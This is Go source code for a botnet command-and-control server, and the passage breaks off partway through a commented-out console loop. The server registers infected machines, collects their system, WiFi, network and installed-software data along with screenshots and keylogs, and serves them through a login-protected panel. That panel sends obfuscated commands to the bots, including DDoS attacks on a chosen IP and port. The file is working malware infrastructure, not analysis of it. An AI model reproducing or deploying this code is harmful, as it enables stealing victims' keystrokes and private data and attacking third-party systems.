//Must work Cross-Platform
//Basic Command and Control, for commanding bulk bots
//Bot Information will be stored in DB
//Bot Files, Screenshots, Keylogs, Ect... With be stored on file in folders
//Commands will be stored in DB
//Bot Folders/Files will be able to be accsessed via HTML dash with Auth

//SQL Based Account System
//Hard-Coded Account

//Encode Data = Text -> Base64 -> Obfuscate
//Decode Data = Deobfuscate -> Base64 -> Text

//Bot will use a get command with its GUID to tell the C&C that its done the command, for confirmation.

//Control Panel (PANEL) will show 10 bots at most before paging it
//Control Panel will have seprate controls for DDoS and normal commands

// Mutli Command ex. 0d6d83ae-e2b6-4ce9-b774-5714acbfbdbb,528cd466-1edb-405b-9d81-4aa41f0c6abb,a2e686d1-4003-4515-9035-e85bbc821a16|0x1|www.google.com|1

//Panel used http://purecss.io/ for CSS

// 0 = GUID
// 1 = IP
// 2 = WhoAmI
// 3 = OS
// 4 = Install Date and Time
// 5 = Has Admin Rights
// 6 = Anti-Virus Name
// 7 = CPU Name
// 8 = GPU Name
// 9 = System Information
// 10 = WiFi Information
// 11 = IPConfig Information
// 12 = Installed Software
// 13 = First Screenshot
// ...
package main

import (
	"database/sql"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"
	_ "github.com/lib/pq"
)

var (
	//ControlUser is Hard Coded Username
	ControlUser = "root"

	//ControlPass is Hard Coded Password (MD5: toor)
	ControlPass = "7b24afc8bc80e548d66c4e7ff72171c5"

	useSSL       = false                              //Use SSL?
	myIP         = "0.0.0.0"                          //IP to run Server on
	myPort       = "9990"                             //Port to run Server on, Ignored if running SSL
	userAgentKey = "d5900619da0c8a72e569e88027cd9490" // UserAgent for detecting bots

	pqUser = "botadmin"  //SQL Database Username
	pqPass = "thisisme!" //SQL Database Password
	pqHost = "db"        //SQL Database Host
	pqName = "panel"     //SQL Database name

	db         *sql.DB
	err        error
	isPanel    = true
	isNew      = true
	isEnabled  = true
	maxBotList = 2 // check this out!
	baseDir    = "./Profiles"
)

type botList struct {
	DBTotal    string
	DBAdmin    string
	TotalFiles string

	DBGUID        string
	DBIP          string
	DBWHOAMI      string
	DBOS          string
	DBADMINRIGHTS string
	DBANTIVIRUS   string
	DBLASTCHECKIN string
}

func count() int { //Count Bot Rows
	rows, err := db.Query("SELECT COUNT(*) AS count FROM clients")
	if err != nil {
		return 0
	}
	var count int

	defer rows.Close()
	for rows.Next() {
		rows.Scan(&count)
	}
	return count
}

func countAdmin() int { //Count Bot Rows with admin
	rows, _ := db.Query("SELECT COUNT(*) AS count FROM clients WHERE isadmin= 'Yes'")
	var count int

	defer rows.Close()
	for rows.Next() {
		rows.Scan(&count)
	}
	return count
}

func reportError(w http.ResponseWriter, err error) {
	fmt.Fprintf(w, "Error during operation: %s", err)
}

func countFiles() int { //Count # of files
	var tmpint int
	profiles, _ := ioutil.ReadDir("./Profiles")
	for _, f := range profiles {
		files, _ := ioutil.ReadDir("./Profiles/" + f.Name() + "/Files")
		tmpint = tmpint + len(files)
	}
	return tmpint
}

func createcountDiv() string {
	return `<div align="center">Total in Database: [` + strconv.Itoa(count()) + `] | Total with Admin: [` + strconv.Itoa(countAdmin()) + `] | Total Files in Database: [` + strconv.Itoa(countFiles()) + `]</div>`
}

func getLastLogin(set bool) string {
	var tmp string
	if set {
		_, err := db.Exec("UPDATE lastlogin SET timeanddate='" + time.Now().Format(time.RFC1123Z) + "' WHERE id=1")
		if err != nil {
			fmt.Println(err)
		}
		return ""
	}
	err := db.QueryRow("SELECT timeanddate FROM lastlogin WHERE id=1").Scan(&tmp)
	if err != nil {

		_, _ = db.Exec("INSERT INTO lastlogin (timeanddate) VALUES ('never')")
		return "Never"
	}
	return tmp
}

func newHandler(response http.ResponseWriter, request *http.Request) { //Get Basic Information (GUID, IP, Is Admin, Ect...)
	if isEnabled {
		if isNew {
			if request.UserAgent() == userAgentKey {

				request.ParseForm()
				//CONIP := strings.Split(request.RemoteAddr, ":")[0]
				GUID := request.FormValue("0")
				IP := request.FormValue("1")
				WHOAMI := request.FormValue("2")
				OS := request.FormValue("3")
				INSTALL := request.FormValue("4")
				ADMIN := request.FormValue("5")
				AV := request.FormValue("6")
				CPU := request.FormValue("7")
				GPU := request.FormValue("8")
				VERSION := request.FormValue("9")
				SYSINFO := request.FormValue("10")
				WIFIINFO := request.FormValue("11")
				IPCON := request.FormValue("12")
				INSTSOFT := request.FormValue("13")
				INTPIC := request.FormValue("14")

				//Make Security checks to see if is valid data and not junk...
				//Maybe compair IP of Bots info with the request IP?
				//Check for duplicates, ignore if dupe found
				//Look for key words that should be found in it

				var tmpguid string
				err := db.QueryRow("SELECT guid FROM clients WHERE guid=$1", GUID).Scan(&tmpguid)
				switch {
				case err == sql.ErrNoRows:
					_, err = db.Exec("INSERT INTO clients(guid, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastcheckin, lastcommand) VALUES($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12)", GUID, IP, WHOAMI, OS, INSTALL, ADMIN, AV, CPU, GPU, VERSION, time.Now().Format(time.RFC1123Z), "Not Completed....")
					if err != nil {
						logUpdate("ERROR with Database! " + err.Error())
						return
					}

					_ = createDir("./Profiles/"+GUID+"/", 777)
					_ = createDir("./Profiles/"+GUID+"/Files", 777)
					_ = createDir("./Profiles/"+GUID+"/Screenshots", 777)
					_ = createDir("./Profiles/"+GUID+"/Keylogs", 777)

					writefile, _ := os.Create("./Profiles/" + GUID + "/Screenshots/Default.png")
					writefile.WriteString(string(base64Decode(INTPIC)))
					writefile.Close()

					output := strings.Replace(base64Decode(INSTSOFT), "|", "\n", -1)

					_ = createFileAndWriteData("./Profiles/"+GUID+"/Files/System Information.txt", []byte(base64Decode(SYSINFO)))
					_ = createFileAndWriteData("./Profiles/"+GUID+"/Files/WiFi Information.txt", []byte(base64Decode(WIFIINFO)))
					_ = createFileAndWriteData("./Profiles/"+GUID+"/Files/IP Config.txt", []byte(base64Decode(IPCON)))
					_ = createFileAndWriteData("./Profiles/"+GUID+"/Files/Installed Software.txt", []byte(output))

					logUpdate("New bot registered " + GUID)

					fmt.Fprintf(response, "ok")
				case err != nil:
					fmt.Fprintf(response, "err")
				default:
					fmt.Fprintf(response, "exist")
				}
			}
		}
	}
}

func updateHandler(response http.ResponseWriter, request *http.Request) { //Update selected rows)
	if isEnabled {
		request.ParseForm()
		//conip := strings.Split(request.RemoteAddr, ":")[0]
		//name := request.FormValue("0")
		//pass := request.FormValue("1")

		//Check if GUID already exists in DB, If not...
		//Add all the data to DB row for the bot
		//If good, return "ok" else "bad" and bot will try again later
		fmt.Fprintf(response, "ok")
	}
}

func screenshotHandler(response http.ResponseWriter, request *http.Request) { //Create a ScreenShot imange
	if isEnabled {
		if request.UserAgent() == userAgentKey {
			request.ParseForm()
			GUID := request.Form.Get("0") //Does this work, need to test
			DATA := request.FormValue("1")
			var tmpguid string
			var tmpint int
			files, _ := ioutil.ReadDir("./Profiles/" + GUID + "/Screenshots")
			tmpint = len(files) + 1
			s1 := strconv.Itoa(tmpint)
			err := db.QueryRow("SELECT guid FROM clients WHERE guid=$1", GUID).Scan(&tmpguid)
			if err == sql.ErrNoRows {
				fmt.Fprintf(response, "spin") //Tell bot it needs to register
			} else { //Return Command from SQL
				result := strings.Replace(time.Now().Format(time.RFC822), ":", "-", -1)
				writefile, _ := os.Create("./Profiles/" + GUID + "/Screenshots/" + s1 + "." + result + ".png") //example: 9283.29 Oct 16 23-50 EDT.png
				writefile.WriteString(string(base64Decode(DATA)))
				writefile.Close()
				//logUpdate("New screenshot from " + guid)
				fmt.Fprintf(response, "done")
			}
		}
	}
}

func keylogHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if request.UserAgent() == userAgentKey {
			request.ParseForm()
			GUID := request.Form.Get("0")
			DATA := request.FormValue("1")
			var tmpguid string
			var tmpint int
			files, _ := ioutil.ReadDir("./Profiles/" + GUID + "/Keylogs")
			tmpint = len(files) + 1
			s1 := strconv.Itoa(tmpint)
			err := db.QueryRow("SELECT guid FROM clients WHERE guid=$1", GUID).Scan(&tmpguid)
			if err == sql.ErrNoRows {
				fmt.Fprintf(response, "spin") //Tell bot it needs to register
			} else { //Return Command from SQL
				result := strings.Replace(time.Now().Format(time.RFC822), ":", "-", -1)
				writefile, _ := os.Create("./Profiles/" + GUID + "/Keylogs/" + s1 + "." + result + ".txt") //example: 9283.29 Oct 16 23-50 EDT.txt
				writefile.WriteString(string(base64Decode(DATA)))
				writefile.Close()
				fmt.Fprintf(response, "done")
			}
		}
	}
}

func profileFilesHandler(response http.ResponseWriter, request *http.Request) { //Host the Profiles folder and sub files.
	if isEnabled {
		userName := getUserName(request)
		if userName != "" {
			url := request.URL.Path

			var newurl = strings.Replace(url, "files", "", -1)

			var fixhtml2 string

			// Ignore favicon
			if newurl == "/favicon.ico" {
			} else {
				urlPath := baseDir + newurl
				f, err := os.Open(urlPath)
				if err != nil {
					reportError(response, err)
					return
				}

				defer f.Close()
				fi, err := f.Stat()
				if err != nil {
					reportError(response, err)
					return
				}

				// Have enough info to figure out what to send back
				switch mode := fi.Mode(); {
				case mode.IsDir():
					files, err := ioutil.ReadDir(urlPath)
					if err != nil {
						reportError(response, err)
						return
					}

					last, err := filepath.Abs(path.Join(url, ".."))
					if err != nil {
						reportError(response, err)
						return
					}

					output := "<li>[Dir] <a href=\"" + last + "\">..</a>" //Need to fix this, Its not including the sites address?
					for _, element := range files {
						output += "<li>"
						if element.IsDir() {
							output += "[Dir] "
						} else {
							output += "[File] "
						}
						output += "<a href=\"" + path.Join(url, element.Name()) + "\">" + element.Name() + "</a>"
					}
					var fixhtml = strings.Replace(filebrowseHTML, "{STATS}", createcountDiv(), -1)
					var fixhtml1 = strings.Replace(fixhtml, "{FILES}", output, -1)
					if useSSL {
						fixhtml2 = strings.Replace(fixhtml1, "{HOST}", "https://"+request.Host, -1)
					} else {
						fixhtml2 = strings.Replace(fixhtml1, "{HOST}", "http://"+request.Host, -1)
					}
					fmt.Fprintf(response, fixhtml2)
				case mode&os.ModeType == 0:
					content := "application/octet-stream"
					extension := filepath.Ext(urlPath)
					switch extension {
					case ".pdf":
						content = "application/pdf"
					case ".mp3":
						content = "audio/mp3"
					case ".jpg":
						content = "image/jpeg"
					case ".gif":
						content = "image/gif"
					case ".png":
						content = "image/png"
					case ".css":
						content = "text/css"
					case ".html":
						content = "text/html"
					case ".js":
						content = "text/javascript"
					case ".mp4":
						content = "video/mp4"
					case ".sh":
						content = "text/plain"
					case ".txt":
						content = "text/plain"
					case ".xml":
						content = "application/xml"
					}

					text, err := ioutil.ReadFile(urlPath)
					if err != nil {
						reportError(response, err)
						return
					}

					response.Header().Set("Content-Type", content)
					response.Write(text)
				}
			}
		} else {
			fmt.Fprintf(response, loginHTML)
		}
	}
}

func uploadHandler(response http.ResponseWriter, request *http.Request) { //Upload file
	if isEnabled {
		//guid := request.FormValue("0")

		//display success message.
	}
}

func setCommand(cmd string) bool { //Set Command to DB
	var tmpcmd string

	_ = db.QueryRow("SELECT command FROM command WHERE id=1").Scan(&tmpcmd)
	if tmpcmd == "" {
		_, err := db.Exec("INSERT INTO command(id, command, timeanddate) VALUES($1, $2, $3)", 1, "none", "never")
		if err != nil {
			fmt.Println(err)
			return false
		}
	}

	_, err := db.Exec("UPDATE command SET command='" + cmd + "', timeanddate='" + time.Now().Format(time.RFC1123Z) + "' WHERE id=1")
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func commandHandler(response http.ResponseWriter, request *http.Request) { //Return Command from DB
	if isEnabled {
		if request.UserAgent() == userAgentKey {
			request.ParseForm()

			GUID := request.Form.Get("0")
			CHECK := request.Form.Get("1") //See if the bot confirming it ran the last command

			var tmpguid string
			var tmpcmd string
			var tmpdata string

			err := db.QueryRow("SELECT guid FROM clients WHERE guid=$1", GUID).Scan(&tmpguid)

			if err == sql.ErrNoRows {

				fmt.Fprintf(response, "spin") //Tell bot it needs to register

			} else { //Return Command from SQL

				err := db.QueryRow("SELECT command, timeanddate FROM command WHERE id=1").Scan(&tmpcmd, &tmpdata)
				if err != nil {
					//logUpdate("Somethings wrong with the Command Database")
					fmt.Fprintf(response, "spin") //No commands in the table?
				}
				//UPDATE `clients` SET `lastcheckin` = 'Sunday, 06-Nov-16 01:08:11 EST', `lastcommand` = 'Not Completed...' WHERE `clients`.`guid` = '86b4f9e6-366b-47b0-ab4e-15c6cd2f7074';
				_, err = db.Exec("UPDATE clients SET lastcommand='" + CHECK + "' WHERE guid='" + GUID + "'")
				if err != nil {
					fmt.Println(err)
				}

				_, err = db.Exec("UPDATE clients SET lastcheckin='" + time.Now().Format(time.RFC1123Z) + "' WHERE guid='" + GUID + "'")
				if err != nil {
					fmt.Println(err)
				}

				fmt.Fprintf(response, tmpdata+"||"+tmpcmd)
			}
		}
	}
}

func commandIssue() (string, string) {
	var tmpcmd string
	var tmpdatetime string

	_ = db.QueryRow("SELECT command FROM command WHERE id=1").Scan(&tmpcmd)
	_ = db.QueryRow("SELECT timeanddate FROM command WHERE id=1").Scan(&tmpdatetime)

	if tmpcmd == "" {
		tmpcmd = "None"
	}
	if tmpdatetime == "" {
		tmpdatetime = "Never"
	}

	return tmpcmd, tmpdatetime
}

func logoutHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		clearSession(response)
		http.Redirect(response, request, "/", 302)
	}
}

func loginHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if isPanel {
			request.ParseForm()
			ip := strings.Split(request.RemoteAddr, ":")[0]
			name := request.FormValue("username")
			pass := request.FormValue("password")
			redirectTarget := "/"
			if name != "" && pass != "" {
				if name == ControlUser && md5Hash(pass) == ControlPass || loginBasic(name, pass) {
					setSession(name, response)
					redirectTarget = "/panel"
				}
				http.Redirect(response, request, redirectTarget, 302)
			} else {
				logUpdate("Failed View Login from " + ip + " using " + name + " and password " + pass)
				fmt.Fprintf(response, "404 page not found")
			}
		}
	}
}

func infoHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		userName := getUserName(request)
		if userName != "" {
			//output := strings.Replace(infoHTML, "{CPU}", CPU, -1)
			request.ParseForm()
			GUID := request.Form.Get("guid")

			var tmpguid string

			err := db.QueryRow("SELECT guid FROM clients WHERE guid=$1", GUID).Scan(&tmpguid)
			if err == sql.ErrNoRows {
				//Does not exist?
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No entry by GUID found")
				result := r.Replace(errorHTML)
				fmt.Fprintf(response, result)
			} else {
				//Found, lets get the info we need....
				var tmpip string
				var tmpwhoami string
				var tmpos string
				var tmpinstall string
				var tmpisadmin string
				var tmpav string
				var tmpcpu string
				var tmpgpu string
				var tmpver string
				var tmplastcheck string

				err := db.QueryRow("SELECT ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastcheckin FROM clients WHERE guid=$1", GUID).Scan(&tmpip, &tmpwhoami, &tmpos, &tmpinstall, &tmpisadmin, &tmpav, &tmpcpu, &tmpgpu, &tmpver, &tmplastcheck)
				if err != nil {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
					result := r.Replace(errorHTML)
					fmt.Fprintf(response, result)
				}

				r := strings.NewReplacer("{STATS}", createcountDiv(), "{GUID}", GUID, "{IP}", tmpip, "{WHOAMI}", tmpwhoami, "{OS}", tmpos, "{ADMIN}", tmpisadmin, "{AV}", tmpav, "{LASDATE}", tmplastcheck, "{INSDATE}", tmpinstall, "{CPU}", tmpcpu, "{GPU}", tmpgpu, "{VERSION}", tmpver)
				result := r.Replace(infoHTML)

				rr := strings.NewReader(result)
				io.Copy(response, rr) //dirty, to lazy to fix the damn error so this will work fine.
			}
		} else {
			fmt.Fprintf(response, loginHTML)
		}
	}
}

func panelHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if isPanel {
			userName := getUserName(request)
			if userName != "" {
				request.ParseForm()
				OFFSET := request.Form.Get("page") //Row count Offset

				var top = count()
				if OFFSET == "" {
					OFFSET = "1"
				}
				offsetint, _ := strconv.Atoi(OFFSET)
				if top == 0 {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No Bots in Database")
					result := r.Replace(errorHTML)
					fmt.Fprintf(response, result)
				} else {
					var tableRaw string
					//Need {GUID}, {IP}, {WHOAMI}, {OS}, {ADMIN}, {AV} and {LASDATE)
					var tmpguid, tmpip, tmpwhoami, tmpos, tmpadmin, tmplastcheck string
					rows, err := db.Query("SELECT guid, ip, whoami, os, isadmin, lastcheckin FROM clients ORDER BY id DESC LIMIT $1 OFFSET $2", maxBotList, maxBotList*(offsetint-1))
					//fmt.Println("Query: ", err.Error)
					if err != nil && err != sql.ErrNoRows {
						r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
						result := r.Replace(errorHTML)
						fmt.Fprintf(response, result)
					}

					for rows.Next() {
						err := rows.Scan(&tmpguid, &tmpip, &tmpwhoami, &tmpos, &tmpadmin, &tmplastcheck)

						if err != nil {
							r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
							result := r.Replace(errorHTML)
							fmt.Fprintf(response, result)
						}

						var tmptableRaw string
						tmptableRaw = botTableHTML
						r := strings.NewReplacer("{GUID}", tmpguid, "{IP}", tmpip, "{WHOAMI}", tmpwhoami, "{OS}", tmpos, "{ADMIN}", tmpadmin, "{LASDATE}", tmplastcheck)
						result := r.Replace(tmptableRaw)
						tableRaw += result
					}

					var s string
					if offsetint != 1 {
						s = strconv.Itoa(offsetint - 1)
					} else {
						s = strconv.Itoa(offsetint)
					}

					s1 := strconv.Itoa(offsetint + 1)

					r := strings.NewReplacer("{STATS}", createcountDiv(), "{RAWTABLE}", tableRaw, "{BACK}", s, "{NEXT}", s1)
					result := r.Replace(panelHTML)

					rr := strings.NewReader(result)

					io.Copy(response, rr) //still dirty
				}
			} else {
				fmt.Fprintf(response, loginHTML)
			}
		} else {
			fmt.Fprintf(response, "404 page not found")
		}
	}
}

func sendCMDHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		userName := getUserName(request)
		if userName != "" {
			request.ParseForm()
			var guidList []string
			guidList = request.Form["selectedbot"]             //All the selected bots
			botSelection := request.FormValue("botsselection") //Selected or All bots
			commandType := request.FormValue("commandtype")    //Command Code, See manual
			arguments := request.FormValue("arg1")             //Args for the command
			if botSelection == "" || commandType == "" || arguments == "" {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Somethings not right...")
				result := r.Replace(errorHTML)
				fmt.Fprintf(response, result)
			} else {
				var tmpguidlist string

				if botSelection == "000" {
					tmpguidlist = "000"
				} else {
					for _, guid := range guidList {
						tmpguidlist += guid + ","
					}
				}
				tmpstring := tmpguidlist + "|" + commandType + "|" + arguments
				done := setCommand(obfuscate(base64Encode(tmpstring)))
				if done {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
					result := r.Replace(successHTML)
					fmt.Fprintf(response, result)
				} else {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
					result := r.Replace(errorHTML)
					fmt.Fprintf(response, result)
				}
			}
		} else {
			fmt.Fprintf(response, loginHTML)
		}
	}
}

func ddosCMDHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		userName := getUserName(request)
		if userName != "" {
			request.ParseForm()
			ddosmode := request.FormValue("ddosmode")
			ip := request.FormValue("ip")
			port := request.FormValue("port")
			threads := request.FormValue("threads")
			interval := request.FormValue("interval")
			fmt.Println(ddosmode, ip, port, threads, interval)
			if ddosmode == "" || ip == "" || port == "" || threads == "" || interval == "" {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Somethings not right...")
				result := r.Replace(errorHTML)
				fmt.Fprintf(response, result)
			} else {
				tmpstring := "000|0x3|" + ddosmode + "|" + ip + ":" + port + "|" + threads + "|" + interval
				done := setCommand(obfuscate(base64Encode(tmpstring)))
				if done {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
					result := r.Replace(successHTML)
					fmt.Fprintf(response, result)
				} else {
					r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
					result := r.Replace(errorHTML)
					fmt.Fprintf(response, result)
				}
			}
		} else {
			fmt.Fprintf(response, loginHTML)
		}
	}
}

func stopDDOSHandler(response http.ResponseWriter, request *http.Request) {
	userName := getUserName(request)
	if userName != "" {
		tmpstring := "000|0x4|"
		done := setCommand(obfuscate(base64Encode(tmpstring)))
		if done {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
			result := r.Replace(successHTML)
			fmt.Fprintf(response, result)
		} else {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
			result := r.Replace(errorHTML)
			fmt.Fprintf(response, result)
		}
	} else {
		fmt.Fprintf(response, loginHTML)
	}
}

func refreshHandler(response http.ResponseWriter, request *http.Request) {
	userName := getUserName(request)
	if userName != "" {
		tmpstring := "000|refresh|"
		done := setCommand(obfuscate(base64Encode(tmpstring)))
		if done {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Command Issued!")
			result := r.Replace(successHTML)
			fmt.Fprintf(response, result)
		} else {
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Issuing Command")
			result := r.Replace(errorHTML)
			fmt.Fprintf(response, result)
		}
	} else {
		fmt.Fprintf(response, loginHTML)
	}
}

func indexHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		ip := strings.Split(request.RemoteAddr, ":")[0]
		logUpdate("Index visited by " + ip)
		fmt.Fprintf(response, "404 page not found")
	}
}

func purgeHandler(response http.ResponseWriter, request *http.Request) {
	userName := getUserName(request)
	if userName != "" {
		request.ParseForm()
		GUID := request.Form.Get("guid")
		var tmpguid string

		err := db.QueryRow("SELECT guid FROM clients WHERE guid=$1", GUID).Scan(&tmpguid)
		if err == sql.ErrNoRows {
			//Does not exist?
			r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "No entry by GUID found")
			result := r.Replace(errorHTML)
			fmt.Fprintf(response, result)
		} else {
			err1 := db.QueryRow("DELETE FROM clients WHERE guid=$1", GUID)
			if err1 != nil {
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{ERROR}", "Database Error")
				result := r.Replace(errorHTML)
				fmt.Fprintf(response, result)
			} else {
				//Files will be kept
				r := strings.NewReplacer("{STATS}", createcountDiv(), "{MESSAGE}", "Client Purged from Database!")
				result := r.Replace(successHTML)
				fmt.Fprintf(response, result)
			}
		}
	} else {
		fmt.Fprintf(response, loginHTML)
	}
}

func ipHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		ip := strings.Split(request.RemoteAddr, ":")[0]
		fmt.Fprintf(response, ip)
	}
}

func loginBasic(user, pass string) bool {
	var databaseUsername string
	var databasePassword string
	err := db.QueryRow("SELECT username, password FROM accounts WHERE username=$1", user).Scan(&databaseUsername, &databasePassword)
	if err != nil {
		return false
	}
	if databasePassword == md5Hash(pass) {
		return true
	}
	return false
}

func backend() {
	router := mux.NewRouter()
	router.HandleFunc("/", indexHandler)
	router.HandleFunc("/ip", ipHandler)
	router.HandleFunc("/ss", screenshotHandler)
	router.HandleFunc("/key", keylogHandler)
	router.HandleFunc("/new", newHandler).Methods("POST")
	router.HandleFunc("/sendcmd", sendCMDHandler).Methods("POST")
	router.HandleFunc("/cmdddos", ddosCMDHandler).Methods("POST")
	router.HandleFunc("/stopddos", stopDDOSHandler)
	router.HandleFunc("/panel", panelHandler)
	router.HandleFunc("/purge", purgeHandler)
	router.HandleFunc("/refresh", refreshHandler)
	router.HandleFunc("/info", infoHandler)
	http.HandleFunc("/files/", profileFilesHandler)
	router.HandleFunc("/login", loginHandler).Methods("POST")
	router.HandleFunc("/logout", logoutHandler)
	router.HandleFunc("/update", updateHandler).Methods("POST")
	router.HandleFunc("/command", commandHandler)
	http.Handle("/", router)
	if useSSL {
		err := http.ListenAndServeTLS(":"+myPort, "server.crt", "server.key", nil) //:443
		if err != nil {
			logUpdate("SSL Server Error: " + err.Error())
			fmt.Println("SSL Server Error: " + err.Error())
			os.Exit(0)
		}
	} else {
		http.ListenAndServe(":"+myPort, nil)
	}
}

func main() {

	if len(os.Args) < 2 {
		os.Exit(0)
	}
	// connStr := "postgres://" + pqUser + ":" + pqPass + "@" + pqHost + "/" + pqName + "?sslmode=disable"
	// db, err = sql.Open("postgres", connStr)
	db, err = sql.Open("postgres", "user="+pqUser+" password="+pqPass+" host="+pqHost+" dbname="+pqName+" sslmode=disable")
	if err != nil {
		fmt.Println("[!] ERROR: CHECK MYSQL SETTINGS! [!]")
		fmt.Println(err)
		os.Exit(0)
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		fmt.Println("[!] ERROR: CHECK IF MYSQL SERVER IS ONLINE! [!]")
		os.Exit(0)
	}

	// go backend()

	if os.Args[1] == ControlUser && md5Hash(os.Args[2]) == ControlPass || loginBasic(os.Args[1], os.Args[2]) {

		rand.Seed(time.Now().UTC().UnixNano())

		if useSSL {
			if !checkFileExist("server.crt") || !checkFileExist("server.key") {
				fmt.Println("[!] WARNING MAKE SURE YOU HAVE YOUR SSL FILES IN THE SAME DIR [!]")
			}
		}

		_ = createDir("./Profiles", 777)
		_ = createDir("./Builds", 777)
		_ = createFile("./logs.txt")

		fmt.Println(banner)
		fmt.Println(" ")
		fmt.Println("Welcome " + ControlUser + "!")
		fmt.Println("====================")
		fmt.Println("Current System Time: " + time.Now().Format(time.RFC1123Z))
		fmt.Println("Last Login: " + getLastLogin(false))
		fmt.Println("====================")

		_ = getLastLogin(true)

		fmt.Println(" ")

		logUpdate(ControlUser + " has logged in.")

		/* for {
		Start:
			fmt.Print("0-> ")
			scan := bufio.NewScanner(os.Stdin)
			time.Sleep(time.Second * 2)
			scan.Scan()
			switch scan.Text() {
			case "whoami": //Lists the Address to the C&C server
				if useSSL {
					fmt.Println("https://" + myIP + ":" + myPort + "/")
				} else {
					fmt.Println("http://" + myIP + ":" + myPort + "/")
				}
			case "help": //List Help, Commands and Descriptions
				fmt.Println(" ")
				fmt.Println("===== HELP =====")
				fmt.Println("	help = Shows Help information")
				//	fmt.Println("	listbots = List all known bots")
				fmt.Println("	mode = Enable and Disable Server Functions")
				fmt.Println("	stats = List current BOTNET stats")
				fmt.Println("	command = Advanced BOTNET command Console")
				//fmt.Println("	listproxys = List all running R-Proxy Bots")
				fmt.Println("	whoami = C&C Address for Bots")
				fmt.Println("	tools = C&C Tools")
				fmt.Println("	purge = Purge the bot Database")
				fmt.Println("	panic = Delete and Wipe all C&C Information.")
				fmt.Println("	exit = Shutdown C&C")
				fmt.Println("===== HELP =====")
				fmt.Println(" ")
			case "purge":
				fmt.Println(" ")
				fmt.Println("[!] WARNING: THIS WILL DELETE ALL BOTS AND FILES FROM THE SERVER! [!]")
				fmt.Println("[!] BOTS WILL ATTEMPT TO RE-REGISTER TO C&C ON NEXT CHECK-IN [!]")
				fmt.Println(" ")
				fmt.Println("Are you sure you want to do this?")
				fmt.Print("Yes/No: ")
				scan := bufio.NewScanner(os.Stdin)
				scan.Scan()
				switch scan.Text() {
				case "Yes":

				case "yes":

				case "YES":

				default:
					goto Start
				}
			case "panic": //freak the fuck out and panic to death
				fmt.Println(" ")
				fmt.Println("[!] WARNING: THIS IS DELETE EVERYTHING RELATED TO THE BOTNET! [!]")
				fmt.Println("[!] ALL DATA, FILES, AND THE C&C WILL BE DELETED [!]")
				fmt.Println(" ")
				fmt.Println("Are you sure you want to do this?")
				fmt.Print("Yes/No: ")
				scan := bufio.NewScanner(os.Stdin)
				scan.Scan()
				switch scan.Text() {
				case "Yes":

				case "yes":

				case "YES":

				default:
					goto Start
				}
			case "mode":
				fmt.Println(" ")
				fmt.Println("Enable and Disable Server Functions. Type 'exit' to go back to main menu.")
				fmt.Println(" ")
				for {
					fmt.Print("What to Enable/Disable: ")
					scan := bufio.NewScanner(os.Stdin)
					scan.Scan()
					switch scan.Text() {
					case "all":
						if isEnabled {
							isEnabled = false
							fmt.Println("All Functions Disabled")
							fmt.Println("[!]Warning Bots will not be able to register with the C&C! [!]")
							fmt.Println("[!]Warning Bots will not be able to check for commands with the C&C! [!]")
							fmt.Println("[!]Warning Bots will not be able to upload to the C&C! [!]")
						} else {
							isEnabled = true
							fmt.Println("All Functions Enabled")
						}
					case "panel":
						if isPanel {
							isPanel = false
							fmt.Println("HTML Panel Disabled")
						} else {
							isPanel = true
							fmt.Println("HTML Panel Enabled")
							if useSSL {
								fmt.Println("Login in at " + "https://" + myIP + ":" + myPort + "/panel to view the Panel.")
							} else {
								fmt.Println("Login in at " + "http://" + myIP + ":" + myPort + "/panel to view the Panel.")
							}
						}
					case "new":
						if isNew {
							isNew = false
							fmt.Println("New Bot Registration Disabled")
							fmt.Println("[!]Warning Bots will not be able to register with the C&C! [!]")
						} else {
							isNew = true
							fmt.Println("New Bot Registration Enabled")
						}
					case "help":
						fmt.Println(" ")
						fmt.Println("===== HELP =====")
						fmt.Println("	all = All C&C Functions")
						fmt.Println("	panel = Visual C&C; HTML Panel")
						fmt.Println("	new = Add new bots to the database.")
						fmt.Println("===== HELP =====")
						fmt.Println(" ")
					case "exit":
						goto Start
					case "exit-force":
						os.Exit(0)
					default:
						fmt.Println("[!] Unknown Command! Type 'help' for a list of commands. [!]")
					}
				}
			case "stats": //List Botnet Stats, Bots in DB, Files in DB, Last Check-in, Ect...
				s := strconv.Itoa(count())
